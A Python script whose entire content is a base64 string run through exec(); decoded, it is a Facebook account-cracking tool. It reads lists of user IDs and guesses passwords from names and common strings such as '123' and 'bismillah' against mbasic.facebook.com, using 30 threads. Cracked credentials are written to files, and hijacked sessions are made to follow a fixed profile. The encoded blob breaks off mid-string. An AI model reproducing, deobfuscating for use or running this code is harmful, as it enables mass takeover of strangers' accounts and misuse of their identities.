import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24zCmltcG9ydCBvcwp0cnk6CiAgICBpbXBvcnQgcmVxdWVzdHMKZXhjZXB0IEltcG9ydEVycm9yOgogICAgcHJpbnQoJ1xuIFvinJNdIGluc3RhbGxpbmcgcmVxdWVzdHMgIS4uLlxuJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmVxdWVzdHMnKQoKdHJ5OgogICAgaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBwcmludCgnXG4gW+Kck10gaW5zdGFsbGluZyBmdXR1cmVzICEuLi5cbicpCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGZ1dHVyZXMnKQoKdHJ5OgogICAgaW1wb3J0IGJzNApleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBwcmludCgnXG4gW+Kck10gaW5zdGFsbGluZyBiczQgIS4uLlxuJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykKCmltcG9ydCByZXF1ZXN0cywgb3MsIHJlLCBiczQscGxhdGZvcm0sIHN5cywganNvbiwgdGltZSwgcmFuZG9tLCBkYXRldGltZSwgc3VicHJvY2VzcywgdGhyZWFkaW5nLCBpdGVydG9vbHMsYmFzZTY0LHV1aWQsemxpYgpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIGRpYXpoZWFsdGgKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAKCgpjdCA9IGRhdGV0aW1lLm5vdygpCm4gPSBjdC5tb250aApidWxhbiA9IFsnSmFudWFyeScsICdGZWJydWFyeScsICdNYXJjaCcsICdBcHJpbCcsICdNYXknLCAnSnVuZScsICdKdWx5JywgJ0FndXN0dXMnLCAnU2VwdGVtYmVyJywgJ09jdG9iZXInLCAnTm92ZW1iZXInLCAnRGVjZW1iZXInXQp0cnk6CiAgICBpZiBuIDwgMCBvciBuID4gMTI6CiAgICAgICAgZXhpdCgpCiAgICBuVGVtcCA9IG4gLSAxCmV4Y2VwdCBWYWx1ZUVycm9yOgogICAgZXhpdCgpCgpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkKdGEgPSBjdXJyZW50LnllYXIKYnUgPSBjdXJyZW50Lm1vbnRoCmhhID0gY3VycmVudC5kYXkKb3AgPSBidWxhbltuVGVtcF0KUCA9ICdceDFiWzE7OTdtJyAjIApNID0gJ1wwMzNbMTszMW0nICMgCkggPSAnXDAzM1sxOzMybScgIyAKSyA9ICdceDFiWzE7OTdtJyAjIApCID0gJ1x4MWJbMTs5N20nICMgClUgPSAnXHgxYlsxOzk3bScgIyAKTyA9ICdceDFiWzE7OTdtJyAjIApOID0gJ1x4MWJbMG0nICAgICMgCm15X2NvbG9yID0gWwogUCwgTSwgSCwgSywgQiwgVSwgTywgTl0Kd2FybmEgPSByYW5kb20uY2hvaWNlKG15X2NvbG9yKQpkYXRhLGRhdGEyPXt9LHt9CmFtYW4sY3Asc2FsYWg9MCwwLDAKdWJhaFAsZnVjayxwd0JhcnU9W10sW10sW10Kb2sgPSBbXQpjcCA9IFtdCmlkID0gW10KdXNlciA9IFtdCmxvb3AgPSAwCnVybF9sb29rdXAgPSAiaHR0cHM6Ly9sb29rdXAtaWQuY29tLyIKdXJsX21iID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIKdXJsX2lwID0gImh0dHBzOi8vd3d3Lmh0dHBiaW4ub3JnL2lwIgpoZWFkZXJfZ3J1cCA9IHsidXNlci1hZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTAwLjAuNDg5Ni42MCBTYWZhcmkvNTM3LjM2IEVkZy8xMDAuMC4xMTg1LjI5O10ifQpidWxhbl90dGwgPSB7IjAxIjogIkphbnVhcnkiLCAiMDIiOiAiRmVicnVhcnkiLCAiMDMiOiAiTWFyY2giLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWF5IiwgIjA2IjogIkp1bmUiLCAiMDciOiAiSnVseSIsICIwOCI6ICJBdWd1c3R1cyIsICIwOSI6ICJTZXB0ZW1iZXIiLCAiMTAiOiAiT2N0b2JlciIsICIxMSI6ICJOb3ZlbWJlciIsICIxMiI6ICJEZWNlbWJlciJ9CmRvbmUgPSBGYWxzZQoKZGVmIGphbGFuKHopOgogICAgZm9yIGUgaW4geiArICdcbic6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKICAgICAgICAKbG9nbyA9ICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiIiAgIApcMDMzWzE7OTJtICDil4/ilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzguZHbqdup4LmR4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pePClwwMzNbMTs5M20gIF9fICBfIF8gIF8gIF8gIF9fClwwMzNbMTs5NG0gIC8gXCAvIF98fCB8IHx8IFx8IHwvIF98ClwwMzNbMTs5NW0gICB8IG8gKCB8X258IFUgfHwgXFwgKCB8X24KXDAzM1sxOzk2bSB8X25ffFxfXy98X19ffHxffFxffFxfXy8KXDAzM1sxOzk3beKXj+KWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOC5kdup26nguZHilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzil48KICAgClwwMzNbMTs5M20g4oymIEFVVEhPUiAgICAgIDogQUdVTkctWEQKXDAzM1sxOzk0bSDijKYgV0hBVFNBUFAgICAgOiAwMTMwMzM0NjczMgpcMDMzWzE7OTVtIOKMpiBGQUNFQk9PSyAgICA6IEFHVU5HIFhaSApcMDMzWzE7OTVtIOKMpiAgVGlrdG9rICAgICA6IEFHVU5HIFhaSApcMDMzWzE7OTdtIOKMpiBWRVJTSU9OICAgICA6IDAuMC41ClwwMzNbMTszNm3il4/ilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzguZHbqdup4LmR4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pePICIiIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKZGVmIGhhc2lsKE9LLGNwKToKCWlmIG5vdCBsZW4oT0spICE9IDA6CgkgICAgcGFzcwoJaWYgbGVuKGNwKSAhPSAwOgoJICAgIHByaW50KCdcblxuICBceDFiWzE7OTdtIFRvdGFsIE9LIDogXHgxYlsxOzk3bSAlcyAgXHgxYlsxOzk3SEFDS0VEX09LLnR4dCcgJSAoSCwgUCwgc3RyKGxlbihvaykpKSkKCSAgICBwcmludCgnICBceDFiWzE7OTdtIFRvdGFsIENQIDpceDFiWzE7OTdtICAgJXMgXHgxYlsxOzk3WERfQ1AudHh0JyAlIChILCBQLCBzdHIobGVuKGNwKSkpKQoJICAgIGlucHV0KCJceDFiWzE7OTdtUCBSIEUgUyBTICBUIE8gICBCIEEgQyBLICIpCgkgICAgaGFtaWkoKQoKZGVmIGhhbWlpKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KGxvZ28pCiAgICBpcG0gPSByZXF1ZXN0cy5nZXQodXJsX2lwKS5qc29uKCkKICAgIHRvZHogPSAnJwogICAgSVAgPSBpcG1bJ29yaWdpbiddCiAgICAKICAgIHByaW50KCcgWzFdIFNUQVJUIEZJTEUgQ0xPTklORyBceDFiWzE7OTFtWyBOTyBMT0dJTiBdJykKICAgIHByaW50KCcgXHgxYlsxOzk2bVsyXSBQVUJMSUMgQ0xPTkUgICAgICAgIFx4MWJbMTs5MW0gWyBMT0dJTiBdICcpCiAgICBwcmludCgnIFx4MWJbMTs5Nm1bM10gVU5MSU1JVEVEIEZJTEUgTUFLSU5HJykKICAgIHByaW50KCcgWzRdIEZBQ0VCT09LIEdST1VQIChXQVRJTkcgJykKICAgIHByaW50KCcgW0ZdIEZBQ0VCT09LIElEICcpCiAgICBwcmludCgnIFtZXSBZT1VUVUJFIENIQU5ORUwgKFdBVElORykgJykKICAgIHByaW50KCcgW1ddIFdIQVRTQVBQICcpCiAgICBwcmludCgnIFtFXSBFWElUICcpCiAgICBwcmludCgnJykKICAgIF9oYW1paV9fXyA9IGlucHV0KCcgW+Kck10gQyBIIE8gTyBTIEUgOiAnKQogICAgaWYgX2hhbWlpX19fIGluICgnMScsICcwMScpOgogICAgICAgIF9feHh4X18oKS5oYW1paXgoaWQpCiAgICBpZiBfaGFtaWlfX18gaW4gKCcyJywnMDInKToKICAgICAgICBvcy5zeXN0ZW0oJ3B5dGhvbjMgQUdVTkcucHknKQogICAgaWYgX2hhbWlpX19fIGluICgnMycsJzAzJyk6CiAgICAgICAgb3Muc3lzdGVtKCdweXRob24zIFVubGltaXRlZC1EdW1wLnB5JykKICAgIGlmIF9oYW1paV9fXyBpbiAoJzQnLCcwNCcpOgogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9mYWNlYm9vay5jb20vZ3JvdXBzLy8nKQogICAgaWYgX2hhbWlpX19fIGluICgnVycsICd3Jyk6CiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3dhLm1lLys4ODAxMzAzMzQ2NzMyJykKICAgIGlmIF9oYW1paV9fXyBpbiAoJ0YnLCdmJyk6CiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9MTAwMDcyMjc3MDY3NTI5JykKICAgIGlmIF9oYW1paV9fXyBpbiAoJ1knLCAneScpOgogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly95b3V0dWJlLmNvbS9jLycpCgogICAgaWYgX2hhbWlpX19fIGluICgnRScsICdlJyk6CiAgICAgICAgcGFzcwoKCmNsYXNzIF9feHh4X186CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5pZCA9IFtdCiAgICBkZWYgaGFtaWl4KHNlbGYsaWQpOgogIAogICAgICAgCiAgICAgIAogICAgICAgICAKICAgICAgICAgICAgCgogICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgIHByaW50KGxvZ28pCiAgICAgICAgc2VsZi5jbnQgPSBpbnB1dCgnRiBJIEwgRSAgIFAgQSBUIEggOiAnKQogICAgICAgIHNlbGYuaWQgPSBvcGVuKHNlbGYuY250KS5yZWFkKCkuc3BsaXRsaW5lcygpCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQobG9nbykKICAgICAgICBwcmludCgiIikKICAgICAgICBfX193b3JsZHdpZGVfX18gPSAoJ3knKQogICAgICAgIGlmIF9fX3dvcmxkd2lkZV9fXyBpbiAoJ3llcycsJ1llcycsJ1knLCAneScpOgogICAgICAgICAgICBzZWxmLl9fcGxlcl9fKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCgnIFvinJNdIENob29zZSBDb3JyZWN0IE9uZScpOwogICAgICAgICAgICBzZWxmLmhhbWlpeChpZCkKICAgIGRlZiBfX21ldG9kZV9fKHNlbGYsIHVzZXIsIF9fY2hpX18sIGNlYm9rKToKICAgICAgICBnbG9iYWwgb2ssY3AsbG9vcAogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZiJcciBceDFiWzE7OTZtWyBBR1VOR10ge2xvb3B9fHtsZW4oc2VsZi5pZCl9IFtPS11be2xlbihvayl9XSBbQ1BdW3tsZW4oY3ApfV0gIikKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBwdyBpbiBfX2NoaV9fOgogICAgICAgICAgICAgICAgcHcgPSBwdy5sb3dlcigpCiAgICAgICAgICAgICAgICBzZXNzaW9uPXJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgICAgICAgICAgaGVhZGVyID0gewogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjZWJvaywKICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLAogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTm9raWFDMy0wMC81LjAgKDA4LjYzKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwKICAgICAgICAgICAgICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwKICAgICAgICAgICAgICAgICAgICAiZG50IjoiMSIsCiAgICAgICAgICAgICAgICAgICAgIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5IiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovL20uZmFjZWJvb2suY29tLyIsCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHIgPSBzZXNzaW9uLmdldChmImh0dHBzOi8ve2NlYm9rfS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwgaGVhZGVycz1oZWFkZXIpCiAgICAgICAgICAgICAgICBkYXMgPSB7CiAgICAgICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksCiAgICAgICAgICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwKICAgICAgICAgICAgICAgICAgICAidWlkIjp1c2VyLAogICAgICAgICAgICAgICAgICAgICJmbG93IjoibG9naW5fbm9fcGluIiwKICAgICAgICAgICAgICAgICAgICAicGFzcyI6cHcsCiAgICAgICAgICAgICAgICAgICAgIm5leHQiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tL3Rvb2xzL2RlYnVnL2FjY2Vzc3Rva2VuLyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGhlYWRlcjEgPSB7CiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOmNlYm9rLAogICAgICAgICAgICAgICAgICAgICJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwKICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLAogICAgICAgICAgICAgICAgICAgICJvcmlnaW4iOiJodHRwczovLyIrY2Vib2ssCiAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsCiAgICAgICAgICAgICAgICAgICAgInVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNBTVNVTkcgU00tRzc4MEcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFNhbXN1bmdCcm93c2VyLzE2LjAgQ2hyb21lLzkyLjAuNDUxNS4xNjYgTW9iaWxlIFNhZmFyaS81MzcuMzYiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLAogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoiWE1MSHR0cFJlcXVlc3QiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLAogICAgICAgICAgICAgICAgICAgICJyZWZlcmVyIjoiaHR0cHM6Ly8iK2NlYm9rKyIvaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHBvID0gc2Vzc2lvbi5wb3N0KGYiaHR0cHM6Ly97Y2Vib2t9L2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wIiwgZGF0YSA9IGRhcywgaGVhZGVycyA9IGhlYWRlcjEsIGFsbG93X3JlZGlyZWN0cyA9IEZhbHNlKQogICAgICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6CiAgICAgICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJ7SH0g4pWa4pWQ4pWQW0hBQ0tELVNVQ0NFU1NGVUzwn5SlXSB7dXNlcn0gfCB7cHd9IikKCQkJCQkKICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpCiAgICAgICAgICAgICAgICAgICAgb2suYXBwZW5kKHdydCkKICAgICAgICAgICAgICAgICAgICBjZWtfYXBrKGt1a2kpCiAgICAgICAgICAgICAgICAgICAgb3BlbignSEFNSUlfT0sudHh0JyAsICdhJykud3JpdGUoJyVzXG4nICUgd3J0KQogICAgICAgICAgICAgICAgICAgIHNlbGYuZm9sbG93KHNlc3Npb24sY29raSkKCQkJCQkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnogPSBvcGVuKCcudG9rZW4udHh0JykucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGNwX3R0bCA9IHNlc3Npb24uZ2V0KGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20ve3VzZXJ9P2ZpZWxkcz1iaXJ0aGRheSZhY2Nlc3NfdG9rZW49e3Rva2Vuen0nKS5qc29uKClbJ2JpcnRoZGF5J10KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGgsIGRheSwgeWVhciA9IGNwX3R0bC5zcGxpdCgnLycpCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlcyDilZrilZDilZBbSEFDS0VELUNIRUNLUE9JTlTwn5KUXSAlcyB8ICVzICcgJSAoTSwgdXNlciwgcHcpKQogICAgICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpCiAgICAgICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCh3cnQpCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ0hBTUlJX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICAgICAgICAgICAgICAgICAgbW9udGggPSAnJwogICAgICAgICAgICAgICAgICAgICAgICBkYXkgICA9ICcnCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlcyDilZrilZDilZBbSEFDS0VELUNIRUNLUE9JTlTwn5KUXSAlcyB8ICVzICcgJSAoTSwgdXNlciwgcHcpKQogICAgICAgICAgICAgICAgICAgIHdydCA9ICclc3wlcycgJSAodXNlcixwdykKICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQogICAgICAgICAgICAgICAgICAgIG9wZW4oJ0hBTUlJX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBsb29wKz0xCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNlYm9rKQoKICAgIGRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6CiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMDc2MDcwNTQ4NDUnLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQsICdodG1sLnBhcnNlcicpCiAgICAgICAgZ2V0ID0gci5maW5kKCdhJywgc3RyaW5nPSdJa3V0aScpLmdldCgnaHJlZicpCiAgICAgICAgc2Vzc2lvbi5nZXQoKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nICsgc3RyKGdldCkpLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQKCiAgICBkZWYgX19wbGVyX18oc2VsZik6CiAgICAgICAgcHJpbnQoJ1sxXSBBIFUgVCBPICBbIFAgQSBTIFMgXSAnKQogICAgICAgIHByaW50KCdbMl0gQyBSIEEgQyBLICBXSVRIICBOQU1FIEFORCBESUdJVCBQQVNTJykKICAgICAgICBjaGkgPSBpbnB1dCgnXG4gW+Kck10gQyBIIE8gTyBTIEU6ICcpCiAgICAgICAgaWYgY2hpID09ICcnOgogICAgICAgICAgICBwcmludCgnXG5CIFMgRCBLICBTQUhJICBTRUxFQ1QgS1InKQogICAgICAgICAgICBzZWxmLl9fcGxlcl9fKCkKICAgICAgICBlbGlmIGNoaSBpbiAoJzEnLCAnMDEnKToKICAgICAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgICAgICAgIHByaW50KGxvZ28pCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzZtXHIgICAgICAgIFZQTiBOT1QgQUxMT1fwn46DXDAzM1sxOzM3bSIpCiAgICAgICAgICAgIHByaW50KDQ3KiItIikKICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTszNm0gVCBPIFQgQSBMICBJIEQgWiA6IFsgJXMgXSAnICUgbGVuKHNlbGYuaWQpKQogICAgICAgICAgICBwcmludCAoJyAnKQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzM2bSBDIFIgQSBDIEsgSSBOIEcgIFMgVCBBIFIgVC4uLicpCiAgICAgICAgICAgIHByaW50ICgnICcpCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzZtIEZVWEstWU9VICBFVkVOVElORy4uLicpCiAgICAgICAgICAgIHByaW50KDQ3KiItIikKICAgICAgICAgICAgd2l0aCBkaWF6aGVhbHRoKG1heF93b3JrZXJzPTMwKSBhcyBoZWFsdGh3b3JsZDoKICAgICAgICAgICAgICAgIGZvciB6c2IgaW4gc2VsZi5pZDogIyBZbyBOZGFrIFRhdSBLb2sgVGFueWEgU2FpYQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgdWlkLCBuYW1lID0genNiLnNwbGl0KCd8JykKICAgICAgICAgICAgICAgICAgICAgICAgeHogPSBuYW1lLnNwbGl0KCcgJykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHh6KSA9PSAzIG9yIGxlbih4eikgPT0gNCBvciBsZW4oeHopID09IDUgb3IgbGVuKHh6KSA9PSA2OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Il0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbIjc4Njc4NiJdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbIlBha2lzdGFuIl0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFsiYmlzbWlsbGFoIl0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFsiMTIzNDU2Il0KICAgICAgICAgICAgICAgICAgICAgICAgaGVhbHRod29ybGQuc3VibWl0KHNlbGYuX19tZXRvZGVfXywgdWlkLCBwd3gsICJtYmFzaWMuZmFjZWJvb2suY29tIikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgaGFzaWwob2ssY3ApCiAgICAgICAgZWxpZiBjaGkgaW4gKCcyJywgJzAyJyk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgICAgICBwcmludChsb2dvKQogICAgICAgICAgICBwcmludCgiXDAzM1sxOzM3bVxyRW50ZXIgTGFzdCBOYW1lIERpZ2l0c1wwMzNbMTszN21cbiIpCiAgICAgICAgICAgIHAxID0gaW5wdXQoJyAgTmFtZSArIDEgOiAnKQogICAgICAgICAgICBwMiA9IGlucHV0KCcgIE5hbWUgKyAyIDogJykKICAgICAgICAgICAgcDMgPSBpbnB1dCgnICBOYW1lICsgMyA6ICcpCiAgICAgICAgICAgIHA0ID0gaW5wdXQoJyAgTmFtZSArIDQgOiAnKQogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICAgICAgcHJpbnQobG9nbykKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszNm1cciAgICAgICBWUE4gTk9UIEFMTE9X8J+Og1wwMzNbMTszN20iKQogICAgICAgICAgICBwcmludCg0NyoiLSIpCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzZtIFQgTyBUIEEgTCAgSSBEIFogOiBbICVzIF0gJyAlIGxlbihzZWxmLmlkKSkKICAgICAgICAgICAgcHJpbnQgKCcgJykKICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTszNm0gQyBSIEEgQyBLIEkgTiBHICBTIFQgQSBSIFQuLi4nKQogICAgICAgICAgICBwcmludCAoJyAnKQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzM2bSBGVVhLLVlPVSAgRVZFTlRJTkcuLi4nKQogICAgICAgICAgICBwcmludCg0NyoiLSIpCiAgICAgICAgICAgIHdpdGggZGlhemhlYWx0aChtYXhfd29ya2Vycz0zMCkgYXMgaGVhbHRod29ybGQ6CiAgICAgICAgICAgICAgICBmb3IgenNiIGluIHNlbGYuaW